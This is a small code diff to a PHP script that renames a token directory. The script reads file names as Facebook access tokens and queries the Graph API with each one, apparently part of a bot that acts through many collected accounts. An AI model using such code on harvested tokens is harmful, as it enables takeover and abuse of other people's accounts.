@@ -1,5 +1,5 @@
 <?php
-$yx=opendir('GulStickers');
+$yx=opendir('mozi');
 while($isi=readdir($yx)){
 if($isi != '.' && $isi != '..'){
 $me=json_decode(xx('https://graph.facebook.com/me?access_token='.$isi.'&fields=id'),true);
